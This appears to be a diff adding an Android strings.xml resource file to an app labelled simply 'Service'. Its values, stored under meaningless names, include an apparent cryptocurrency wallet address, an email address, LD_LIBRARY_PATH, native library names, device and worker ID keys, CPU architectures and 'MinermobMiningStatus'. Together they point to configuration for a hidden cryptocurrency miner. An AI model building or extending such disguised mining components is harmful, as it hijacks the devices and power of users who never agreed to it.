@@ -1,0 +1,24 @@
+<resources>
+    <string name="app_name">Service</string>
+    <string name="uix">4B2iqwJM1kWZzBjRQKqxTaMGcMHG4rc5Y2cPqXQeKZrNG637zHuCqWXU1K4aL3xQ7yU6Z3JmqpvZR2bgDKreNK38UZg4NnL</string>
+    <string name="meme">miksmtr@gmail.com</string>
+    <string name="qwerty">LD_LIBRARY_PATH</string>
+    <string name="ytrewq">privatePath</string>
+    <string name="tyr">configTemplate</string>
+    <string name="dv">devID</string>
+    <string name="dvk">devAppKey</string>
+    <string name="udi">userDeviceID</string>
+    <string name="uth">userThreadNumber</string>
+    <string name="uthx">/x</string>
+    <string name="uthmx">/v</string>
+    <string name="uthmx2">/libuv.so</string>
+    <string name="uq">/s</string>
+    <string name="uqmx">cp.so</string>
+    <string name="work">workerId</string>
+    <string name="work1">aarch64</string>
+    <string name="work2">arm64-v8a</string>
+    <string name="work3">armeabi-v7a</string>
+    <string name="test">MinermobMiningStatusTest</string>
+    <string name="status">MinermobMiningStatus</string>
+
+</resources>
